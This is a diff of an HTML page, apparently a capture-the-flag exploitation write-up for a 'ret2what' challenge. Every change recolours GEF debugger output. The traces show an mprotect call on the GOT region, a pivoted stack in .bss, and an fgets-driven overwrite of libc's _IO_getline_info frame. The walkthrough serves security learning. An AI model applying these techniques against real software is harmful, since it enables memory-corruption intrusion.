+</span>[*<span style="color:#116329;">Thread Id:1, tid:973820</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x0000004013c9</span> &lt;seccomp_+0x178&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x0000004013c9</span> &lt;seccomp_+0x178&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x0000004013c9</span> &lt;seccomp_+0x178&gt;
 [ <span style="color:#8250df;">#1</span>] <span style="color:#8250df;">0x0000095c8530</span> &lt;NO_SYMBOL&gt;
 [ <span style="color:#8250df;">#2</span>] 0x000000000000 &lt;NO_SYMBOL&gt;
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------------------------------------------------
@@ -457,7 +457,7 @@ Let's just go over the <span class='monospace'>mprotect</span> section. We just 
 
 Executing successfully in a debugger, we can see the <span class='monospace'>mprotect</span> call be made:
 
-<pre><code>    0x7f934733962d <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">7301                </span>  &lt;mprotect+0xd&gt;   <span style="color:#8250df;">jae   </span> <span style="color:#cf222e;">0x7f9347339630</span> &lt;__GI_mprotect+0x10&gt;
+<pre><code>    0x7f934733962d <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">7301                </span>  &lt;mprotect+0xd&gt;   <span style="color:#8250df;">jae   </span> <span style="color:#0550ae;">0x7f9347339630</span> &lt;__GI_mprotect+0x10&gt;
     0x7f934733962f <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">c3                  </span>  &lt;mprotect+0xf&gt;   <span style="color:#8250df;">ret   </span>
     0x7f9347339630 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">488b0da1970d00      </span>  &lt;mprotect+0x10&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rcx</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rip</span> <span style="color:#6e7781;">+</span> <span style="color:#cf222e;">0xd97a1</span><span style="color:#6e7781;">]</span> # 0x7f9347412dd8
     0x7f9347339637 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">f7d8                </span>  &lt;mprotect+0x17&gt;   <span style="color:#6e7781;">neg   </span> <span style="color:#0550ae;">eax</span>
@@ -467,7 +467,7 @@ Executing successfully in a debugger, we can see the <span class='monospace'>mpr
 <span style="color:#cf222e;">[+]</span> <span style="color:#cf222e;">Parameter            Register             Value</span>
     RET                  $rax                 -
     NR                   $rax                 0xa
-    start                $rdi                 <span style="color:#116329;">0x0000000000404000</span> &lt;seccomp_init@got[plt]&gt;  -&gt;  <span style="color:#cf222e;">0x00007f9347425730</span> &lt;seccomp_init&gt;  -&gt;  0x
+    start                $rdi                 <span style="color:#116329;">0x0000000000404000</span> &lt;seccomp_init@got[plt]&gt;  -&gt;  <span style="color:#0550ae;">0x00007f9347425730</span> &lt;seccomp_init&gt;  -&gt;  0x
 9a0a058bfa1e0ff3
 </code></pre>
 
@@ -482,10 +482,10 @@ Afterwards, we simply call another <span class='monospace'>read()</span> to read
     buf                  $rsi                 <span style="text-decoration:underline;">0x0000000000404100</span>  -&gt;  0x0000000000000000
     count                $rdx                 0x0000000000000f00
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1030914</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7f934733e038</span> &lt;getsockopt+0x8&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1030914</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7f934733e038</span> &lt;getsockopt+0x8&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">---------------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x7f934733e038</span> &lt;getsockopt+0x8&gt; (frame name: <span style="color:#953800;">getsockopt_syscall</span>)
-[ <span style="color:#8250df;">#1</span>] <span style="color:#cf222e;">0x7f934733e038</span> &lt;getsockopt+0x8&gt; (frame name: <span style="color:#953800;">__getsockopt</span>)
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x7f934733e038</span> &lt;getsockopt+0x8&gt; (frame name: <span style="color:#953800;">getsockopt_syscall</span>)
+[ <span style="color:#8250df;">#1</span>] <span style="color:#0550ae;">0x7f934733e038</span> &lt;getsockopt+0x8&gt; (frame name: <span style="color:#953800;">__getsockopt</span>)
 [ <span style="color:#8250df;">#2</span>] <span style="text-decoration:underline;">0x000000404100</span> &lt;NO_SYMBOL&gt;
 </code></pre>
 
@@ -527,27 +527,27 @@ When <span class='monospace'>fgets()</span> is called, it calls a lot of differe
 <pre><code>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x401492 89ce                  &lt;main+0x9f&gt;   mov    esi, ecx</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x401494 4889c7                &lt;main+0xa1&gt;   mov    rdi, rax</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x401497 e8d4fbffff            &lt;main+0xa4&gt;   call   0x401070 &lt;memset@plt&gt;</span>
- -&gt; <span style="color:#cf222e;">0x40149c</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">488b15dd2b0000      </span> <span style="color:#cf222e;"> &lt;main+0xa9&gt;</span>   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rdx</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rip</span> <span style="color:#6e7781;">+</span> <span style="color:#cf222e;">0x2bdd</span><span style="color:#6e7781;">]</span> # 0x404080 &lt;stdin@GLIBC_2.2.5&gt;
+ -&gt; <span style="color:#0550ae;">0x40149c</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">488b15dd2b0000      </span> <span style="color:#cf222e;"> &lt;main+0xa9&gt;</span>   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rdx</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">QWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rip</span> <span style="color:#6e7781;">+</span> <span style="color:#cf222e;">0x2bdd</span><span style="color:#6e7781;">]</span> # 0x404080 &lt;stdin@GLIBC_2.2.5&gt;
     0x4014a3 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">488d85f0feffff      </span>  &lt;main+0xb0&gt;   <span style="color:#6e7781;">lea   </span> <span style="color:#0550ae;">rax</span><span style="color:#6e7781;">, [</span><span style="color:#0550ae;">rbp</span> <span style="color:#6e7781;">-</span> <span style="color:#cf222e;">0x110</span><span style="color:#6e7781;">]</span>
     0x4014aa <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">be50010000          </span>  &lt;main+0xb7&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">esi</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x150</span>
     0x4014af <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">4889c7              </span>  &lt;main+0xbc&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">rdi</span><span style="color:#6e7781;">, </span><span style="color:#0550ae;">rax</span>
-    0x4014b2 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">e8c9fbffff          </span>  &lt;main+0xbf&gt;   <span style="color:#8250df;">call  </span> <span style="color:#cf222e;">0x401080</span> &lt;fgets@plt&gt;
+    0x4014b2 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">e8c9fbffff          </span>  &lt;main+0xbf&gt;   <span style="color:#8250df;">call  </span> <span style="color:#0550ae;">0x401080</span> &lt;fgets@plt&gt;
     0x4014b7 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">b800000000          </span>  &lt;main+0xc4&gt;   <span style="color:#6e7781;">mov   </span> <span style="color:#0550ae;">eax</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x0</span>
 <span style="color:#cf222e;">----------------------------------- memory access: $rip+0x2bdd = 0x404080 ----
-</span>      <span style="color:#cf222e;">0x000000404080</span>|+0x0000|+000: <span style="color:#116329;">0x00007f99c6d488e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088
-      <span style="color:#cf222e;">0x000000404088</span>|+0x0008|+001: 0x0000000000000000
-      <span style="color:#cf222e;">0x000000404090</span>|+0x0010|+002: 0x0000000000000000
-      <span style="color:#cf222e;">0x000000404098</span>|+0x0018|+003: 0x0000000000000000
+</span>      <span style="color:#0550ae;">0x000000404080</span>|+0x0000|+000: <span style="color:#116329;">0x00007f99c6d488e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088
+      <span style="color:#0550ae;">0x000000404088</span>|+0x0008|+001: 0x0000000000000000
+      <span style="color:#0550ae;">0x000000404090</span>|+0x0010|+002: 0x0000000000000000
+      <span style="color:#0550ae;">0x000000404098</span>|+0x0018|+003: 0x0000000000000000
 <span style="color:#cf222e;">----------------------------------------------------------------- threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1452864</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x00000040149c</span> &lt;main+0xa9&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1452864</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x00000040149c</span> &lt;main+0xa9&gt;, reason: <span style="color:#8250df;">SINGLE STEP</span>
 <span style="color:#cf222e;">------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x00000040149c</span> &lt;main+0xa9&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x00000040149c</span> &lt;main+0xa9&gt;
 [ <span style="color:#8250df;">#1</span>] 0x000000000000 &lt;NO_SYMBOL&gt;
 <span style="color:#cf222e;">------------------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>p $rsp
-<span style="color:#0550ae;">$8</span> = (void *) <span style="color:#cf222e;">0x404f10</span>
+<span style="color:#0550ae;">$8</span> = (void *) <span style="color:#0550ae;">0x404f10</span>
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>p $rbp
-<span style="color:#0550ae;">$9</span> = (void *) <span style="color:#cf222e;">0x404f80</span>
+<span style="color:#0550ae;">$9</span> = (void *) <span style="color:#0550ae;">0x404f80</span>
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
 </code></pre>
 
@@ -557,24 +557,24 @@ Here, I have set up <span class='monospace'>rsp</span> and <span class='monospac
 </span>    <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f99c6bf0678 0f1f840000000000      &lt;__internal_syscall_cancel+0x58&gt;   nop    DWORD PTR [rax+rax*1+0x0]</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f99c6bf0680 488b442410            &lt;__internal_syscall_cancel+0x60&gt;   mov    rax, QWORD PTR [rsp+0x10]</span>
     <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0x7f99c6bf0685 0f05                  &lt;__internal_syscall_cancel+0x65&gt;   syscall</span>
- -&gt; <span style="color:#cf222e;">0x7f99c6bf0687</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5b                  </span> <span style="color:#cf222e;"> &lt;__internal_syscall_cancel+0x67&gt;</span>   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbx</span>
+ -&gt; <span style="color:#0550ae;">0x7f99c6bf0687</span> <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">5b                  </span> <span style="color:#cf222e;"> &lt;__internal_syscall_cancel+0x67&gt;</span>   <span style="color:#6e7781;">pop   </span> <span style="color:#0550ae;">rbx</span>
     0x7f99c6bf0688 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">c3                  </span>  &lt;__internal_syscall_cancel+0x68&gt;   <span style="color:#8250df;">ret   </span>
     0x7f99c6bf0689 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">0f1f8000000000      </span>  &lt;__internal_syscall_cancel+0x69&gt;   <span style="color:#6e7781;">nop   </span> <span style="color:#0550ae;">DWORD</span> <span style="color:#0550ae;">PTR</span> <span style="color:#6e7781;">[</span><span style="color:#0550ae;">rax</span> <span style="color:#6e7781;">+</span> <span style="color:#cf222e;">0x0</span><span style="color:#6e7781;">]</span>
     0x7f99c6bf0690 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">83e239              </span>  &lt;__internal_syscall_cancel+0x70&gt;   <span style="color:#6e7781;">and   </span> <span style="color:#0550ae;">edx</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x39</span>
     0x7f99c6bf0693 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">83fa08              </span>  &lt;__internal_syscall_cancel+0x73&gt;   <span style="color:#6e7781;">cmp   </span> <span style="color:#0550ae;">edx</span><span style="color:#6e7781;">, </span><span style="color:#cf222e;">0x8</span>
-    0x7f99c6bf0696 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">75de                </span>  &lt;__internal_syscall_cancel+0x76&gt;   <span style="color:#8250df;">jne   </span> <span style="color:#cf222e;">0x7f99c6bf0676</span> &lt;__internal_syscall_cancel+0x56&gt;
+    0x7f99c6bf0696 <span style="filter: contrast(70%) brightness(190%);color:#6e7781;">75de                </span>  &lt;__internal_syscall_cancel+0x76&gt;   <span style="color:#8250df;">jne   </span> <span style="color:#0550ae;">0x7f99c6bf0676</span> &lt;__internal_syscall_cancel+0x56&gt;
 <span style="color:#cf222e;">------------------------------------------------------------------------------------------------------------------------------------------------ threads ----
-</span>[*<span style="color:#116329;">Thread Id:1, tid:1452864</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#cf222e;">0x7f99c6bf0687</span> &lt;__internal_syscall_cancel+0x67&gt;, reason: <span style="color:#8250df;">SIGINT</span>
+</span>[*<span style="color:#116329;">Thread Id:1, tid:1452864</span>] Name: &quot;chall_patched&quot;, <span style="color:#cf222e;">stopped</span> at <span style="color:#0550ae;">0x7f99c6bf0687</span> &lt;__internal_syscall_cancel+0x67&gt;, reason: <span style="color:#8250df;">SIGINT</span>
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------------------------------------------------------------- trace ----
-</span>[*<span style="color:#116329;">#0</span>] <span style="color:#cf222e;">0x7f99c6bf0687</span> &lt;__internal_syscall_cancel+0x67&gt;
-[ <span style="color:#8250df;">#1</span>] <span style="color:#cf222e;">0x7f99c6bf06ad</span> &lt;__syscall_cancel+0xd&gt;
-[ <span style="color:#8250df;">#2</span>] <span style="color:#cf222e;">0x7f99c6c64ea6</span> &lt;read+0x16&gt; (frame name: <span style="color:#953800;">__GI___libc_read</span>)
-[ <span style="color:#8250df;">#3</span>] <span style="color:#cf222e;">0x7f99c6beb861</span> &lt;__GI__IO_file_underflow+0x151&gt; (frame name: <span style="color:#953800;">_IO_new_file_underflow</span>)
-[ <span style="color:#8250df;">#4</span>] <span style="color:#cf222e;">0x7f99c6bedbeb</span> &lt;_IO_default_uflow+0x2b&gt; (frame name: <span style="color:#953800;">__GI__IO_default_uflow</span>)
-[ <span style="color:#8250df;">#5</span>] <span style="color:#cf222e;">0x7f99c6be08ca</span> &lt;_IO_getline_info+0xaa&gt; (frame name: <span style="color:#953800;">__GI__IO_getline_info</span>)
-[ <span style="color:#8250df;">#6</span>] <span style="color:#cf222e;">0x7f99c6be09c8</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#8250df;">#7</span>] <span style="color:#cf222e;">0x7f99c6bdf70a</span> &lt;fgets+0x9a&gt; (frame name: <span style="color:#953800;">_IO_fgets</span>)
-[ <span style="color:#8250df;">#8</span>] <span style="color:#cf222e;">0x0000004014b7</span> &lt;main+0xc4&gt;
+</span>[*<span style="color:#116329;">#0</span>] <span style="color:#0550ae;">0x7f99c6bf0687</span> &lt;__internal_syscall_cancel+0x67&gt;
+[ <span style="color:#8250df;">#1</span>] <span style="color:#0550ae;">0x7f99c6bf06ad</span> &lt;__syscall_cancel+0xd&gt;
+[ <span style="color:#8250df;">#2</span>] <span style="color:#0550ae;">0x7f99c6c64ea6</span> &lt;read+0x16&gt; (frame name: <span style="color:#953800;">__GI___libc_read</span>)
+[ <span style="color:#8250df;">#3</span>] <span style="color:#0550ae;">0x7f99c6beb861</span> &lt;__GI__IO_file_underflow+0x151&gt; (frame name: <span style="color:#953800;">_IO_new_file_underflow</span>)
+[ <span style="color:#8250df;">#4</span>] <span style="color:#0550ae;">0x7f99c6bedbeb</span> &lt;_IO_default_uflow+0x2b&gt; (frame name: <span style="color:#953800;">__GI__IO_default_uflow</span>)
+[ <span style="color:#8250df;">#5</span>] <span style="color:#0550ae;">0x7f99c6be08ca</span> &lt;_IO_getline_info+0xaa&gt; (frame name: <span style="color:#953800;">__GI__IO_getline_info</span>)
+[ <span style="color:#8250df;">#6</span>] <span style="color:#0550ae;">0x7f99c6be09c8</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#8250df;">#7</span>] <span style="color:#0550ae;">0x7f99c6bdf70a</span> &lt;fgets+0x9a&gt; (frame name: <span style="color:#953800;">_IO_fgets</span>)
+[ <span style="color:#8250df;">#8</span>] <span style="color:#0550ae;">0x0000004014b7</span> &lt;main+0xc4&gt;
 [ <span style="color:#8250df;">#9</span>] 0x000000000000 &lt;NO_SYMBOL&gt;
 <span style="color:#cf222e;">-------------------------------------------------------------------------------------------------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
@@ -584,48 +584,48 @@ We can see our backtrace, as well as the stack frames of our nested calls. Look 
 
 <pre><code>----------------------------------------------
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>frame 3
-#3  <span style="color:#cf222e;">0x00007f99c6beb861</span> in <span style="color:#953800;">_IO_new_file_underflow</span> (<span style="color:#0550ae;">fp</span>=0x7f99c6d488e0 &lt;_IO_2_1_stdin_&gt;) at <span style="color:#116329;">./libio/libioP.h</span>:1041
+#3  <span style="color:#0550ae;">0x00007f99c6beb861</span> in <span style="color:#953800;">_IO_new_file_underflow</span> (<span style="color:#0550ae;">fp</span>=0x7f99c6d488e0 &lt;_IO_2_1_stdin_&gt;) at <span style="color:#116329;">./libio/libioP.h</span>:1041
 ⚠️ warning: 1041	<span style="color:#116329;">./libio/libioP.h</span>: No such file or directory
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>stack
 <span style="color:#cf222e;">------------------------------------------ Stack top (lower address) ------------------------------------------
 0x000000404e20</span>|+0x0000|+000: <span style="color:#116329;">0x00007f99c6d488e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088<span style="color:#cf222e;">  &lt;-  $r15</span>
-<span style="color:#cf222e;">0x000000404e28</span>|+0x0008|+001: <span style="color:#6e7781;">0x00007f99c6d46fd0</span> &lt;_IO_file_jumps&gt;  -&gt;  0x0000000000000000<span style="color:#cf222e;">  &lt;-  $rbp</span>
-<span style="color:#cf222e;">0x000000404e30</span>|+0x0010|+002: 0x000000000000000a
-<span style="color:#cf222e;">0x000000404e38</span>|+0x0018|+003: <span style="color:#8250df;">0x0000000039f41f71</span>  -&gt;  0x2800000000000000<span style="color:#cf222e;">  &lt;-  $r13</span>
-<span style="color:#cf222e;">0x000000404e40</span>|+0x0020|+004: 0x000000000000014f
-<span style="color:#cf222e;">0x000000404e48</span>|+0x0028|+005: <span style="color:#cf222e;">0x00007f99c6bedbeb</span> &lt;_IO_default_uflow+0x2b&gt;  -&gt;  0x438b480f74fff883<span style="color:#cf222e;">  &lt;-  retaddr[4
+<span style="color:#0550ae;">0x000000404e28</span>|+0x0008|+001: <span style="color:#6e7781;">0x00007f99c6d46fd0</span> &lt;_IO_file_jumps&gt;  -&gt;  0x0000000000000000<span style="color:#cf222e;">  &lt;-  $rbp</span>
+<span style="color:#0550ae;">0x000000404e30</span>|+0x0010|+002: 0x000000000000000a
+<span style="color:#0550ae;">0x000000404e38</span>|+0x0018|+003: <span style="color:#8250df;">0x0000000039f41f71</span>  -&gt;  0x2800000000000000<span style="color:#cf222e;">  &lt;-  $r13</span>
+<span style="color:#0550ae;">0x000000404e40</span>|+0x0020|+004: 0x000000000000014f
+<span style="color:#0550ae;">0x000000404e48</span>|+0x0028|+005: <span style="color:#0550ae;">0x00007f99c6bedbeb</span> &lt;_IO_default_uflow+0x2b&gt;  -&gt;  0x438b480f74fff883<span style="color:#cf222e;">  &lt;-  retaddr[4
 ]</span> ($savedip)
 <span style="color:#cf222e;">---------------------------------------- Stack bottom (higher address) ----------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>frame 4
-#4  <span style="color:#cf222e;">0x00007f99c6bedbeb</span> in <span style="color:#953800;">__GI__IO_default_uflow</span> (<span style="color:#0550ae;">fp</span>=0x7f99c6d488e0 &lt;_IO_2_1_stdin_&gt;) at <span style="color:#116329;">./libio/libioP.h</span>:1041
+#4  <span style="color:#0550ae;">0x00007f99c6bedbeb</span> in <span style="color:#953800;">__GI__IO_default_uflow</span> (<span style="color:#0550ae;">fp</span>=0x7f99c6d488e0 &lt;_IO_2_1_stdin_&gt;) at <span style="color:#116329;">./libio/libioP.h</span>:1041
 ⚠️ warning: 1041	<span style="color:#116329;">./libio/libioP.h</span>: No such file or directory
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>stack
 <span style="color:#cf222e;">------------------------------------------ Stack top (lower address) ------------------------------------------
 0x000000404e50</span>|+0x0000|+000: 0x4343434343434343 <span style="color:#116329;">'CCCCCCCC'</span>
-<span style="color:#cf222e;">0x000000404e58</span>|+0x0008|+001: 0x0000000000000000
-<span style="color:#cf222e;">0x000000404e60</span>|+0x0010|+002: <span style="color:#116329;">0x0000000000404e70</span>  -&gt;  0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
-<span style="color:#cf222e;">0x000000404e68</span>|+0x0018|+003: <span style="color:#cf222e;">0x00007f99c6be08ca</span> &lt;_IO_getline_info+0xaa&gt;  -&gt;  0x000090840ffff883<span style="color:#cf222e;">  &lt;-  retaddr[5]
+<span style="color:#0550ae;">0x000000404e58</span>|+0x0008|+001: 0x0000000000000000
+<span style="color:#0550ae;">0x000000404e60</span>|+0x0010|+002: <span style="color:#116329;">0x0000000000404e70</span>  -&gt;  0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
+<span style="color:#0550ae;">0x000000404e68</span>|+0x0018|+003: <span style="color:#0550ae;">0x00007f99c6be08ca</span> &lt;_IO_getline_info+0xaa&gt;  -&gt;  0x000090840ffff883<span style="color:#cf222e;">  &lt;-  retaddr[5]
 </span> ($savedip)
 <span style="color:#cf222e;">---------------------------------------- Stack bottom (higher address) ----------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>frame 5
-#5  <span style="color:#cf222e;">0x00007f99c6be08ca</span> in <span style="color:#953800;">__GI__IO_getline_info</span> (<span style="color:#0550ae;">fp=fp@entry</span>=0x7f99c6d488e0 &lt;_IO_2_1_stdin_&gt;,
+#5  <span style="color:#0550ae;">0x00007f99c6be08ca</span> in <span style="color:#953800;">__GI__IO_getline_info</span> (<span style="color:#0550ae;">fp=fp@entry</span>=0x7f99c6d488e0 &lt;_IO_2_1_stdin_&gt;,
     <span style="color:#0550ae;">buf=buf@entry</span>=0x404e70 &quot;CCCCCCCCpN@&quot;, <span style="color:#0550ae;">n</span>=0x14f, <span style="color:#0550ae;">delim=delim@entry</span>=0xa,
     <span style="color:#0550ae;">extract_delim=extract_delim@entry</span>=0x1, <span style="color:#0550ae;">eof=eof@entry</span>=0x0) at <span style="color:#116329;">./libio/iogetline.c</span>:60
 ⚠️ warning: 60	<span style="color:#116329;">./libio/iogetline.c</span>: No such file or directory
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>stack
 <span style="color:#cf222e;">------------------------------------------ Stack top (lower address) ------------------------------------------
 0x000000404e70</span>|+0x0000|+000: 0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
-<span style="color:#cf222e;">0x000000404e78</span>|+0x0008|+001: <span style="color:#116329;">0x0000000000404e70</span>  -&gt;  0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
-<span style="color:#cf222e;">0x000000404e80</span>|+0x0010|+002: 0x0000000143434343
-<span style="color:#cf222e;">0x000000404e88</span>|+0x0018|+003: 0x0000000000000000
-<span style="color:#cf222e;">0x000000404e90</span>|+0x0020|+004: 0x4343434343434343
-<span style="color:#cf222e;">0x000000404e98</span>|+0x0028|+005: <span style="color:#0550ae;">0x00007fff4c79a648</span>  -&gt;  <span style="color:#0550ae;">0x00007fff4c79ae9a</span>  -&gt;  0x72772f656d6f682f <span style="color:#116329;">'/home/wrenches
+<span style="color:#0550ae;">0x000000404e78</span>|+0x0008|+001: <span style="color:#116329;">0x0000000000404e70</span>  -&gt;  0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
+<span style="color:#0550ae;">0x000000404e80</span>|+0x0010|+002: 0x0000000143434343
+<span style="color:#0550ae;">0x000000404e88</span>|+0x0018|+003: 0x0000000000000000
+<span style="color:#0550ae;">0x000000404e90</span>|+0x0020|+004: 0x4343434343434343
+<span style="color:#0550ae;">0x000000404e98</span>|+0x0028|+005: <span style="color:#0550ae;">0x00007fff4c79a648</span>  -&gt;  <span style="color:#0550ae;">0x00007fff4c79ae9a</span>  -&gt;  0x72772f656d6f682f <span style="color:#116329;">'/home/wrenches
 /work/pwn/ret2what/chall_patched'</span>
-<span style="color:#cf222e;">0x000000404ea0</span>|+0x0030|+006: <span style="color:#116329;">0x00007f99c6d488e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088<span style="color:#cf222e;">  &lt;-  $r15</span>
-<span style="color:#cf222e;">0x000000404ea8</span>|+0x0038|+007: 0x0000000000000000
-<span style="color:#cf222e;">0x000000404eb0</span>|+0x0040|+008: <span style="color:#116329;">0x0000000000404e70</span>  -&gt;  0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
-<span style="color:#cf222e;">0x000000404eb8</span>|+0x0048|+009: <span style="color:#116329;">0x00007f99c6dc5000</span> &lt;_rtld_global&gt;  -&gt;  <span style="color:#116329;">0x00007f99c6dc6310</span>  -&gt;  0x0000000000000000
-<span style="color:#cf222e;">0x000000404ec0</span>|+0x0050|+010: <span style="color:#6e7781;">0x0000000000403df0</span> &lt;__do_global_dtors_aux_fini_array_entry&gt;  -&gt;  <span style="color:#cf222e;">0x000000000040119
+<span style="color:#0550ae;">0x000000404ea0</span>|+0x0030|+006: <span style="color:#116329;">0x00007f99c6d488e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad2088<span style="color:#cf222e;">  &lt;-  $r15</span>
+<span style="color:#0550ae;">0x000000404ea8</span>|+0x0038|+007: 0x0000000000000000
+<span style="color:#0550ae;">0x000000404eb0</span>|+0x0040|+008: <span style="color:#116329;">0x0000000000404e70</span>  -&gt;  0x4343434343434343 <span style="color:#116329;">'CCCCCCCCpN@'</span>
+<span style="color:#0550ae;">0x000000404eb8</span>|+0x0048|+009: <span style="color:#116329;">0x00007f99c6dc5000</span> &lt;_rtld_global&gt;  -&gt;  <span style="color:#116329;">0x00007f99c6dc6310</span>  -&gt;  0x0000000000000000
+<span style="color:#0550ae;">0x000000404ec0</span>|+0x0050|+010: <span style="color:#6e7781;">0x0000000000403df0</span> &lt;__do_global_dtors_aux_fini_array_entry&gt;  -&gt;  <span style="color:#0550ae;">0x000000000040119
 0</span> &lt;__do_global_dtors_aux&gt;  -&gt;  0x2f0d3d80fa1e0ff3
 <span style="color:#cf222e;">---------------------------------------- Stack bottom (higher address) ----------------------------------------
 </span><span style="font-weight:bold;color:#cf222e;"></span><span style="font-weight:bold;color:#116329;">gef&gt; </span>
@@ -634,28 +634,28 @@ We can see our backtrace, as well as the stack frames of our nested calls. Look 
 And carefully, carefully, after our write finishes, we can see that the stack frame of <span class='monospace'>_IO_getline_info</span> is overwritten. We're at the function prologue's pop chain, with the stack placed over a bountiful field of <span class='monospace'>0x414141</span>s. 
 
 <pre><code><span style="color:#cf222e;">---------------------------------------------------------------------------------------------- stack ----</span>
-$rsp  <span style="color:#cf222e;">0x000000404e98</span>|+0x0000|+000: 0x4141414141414141 <span style="color:#116329;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>
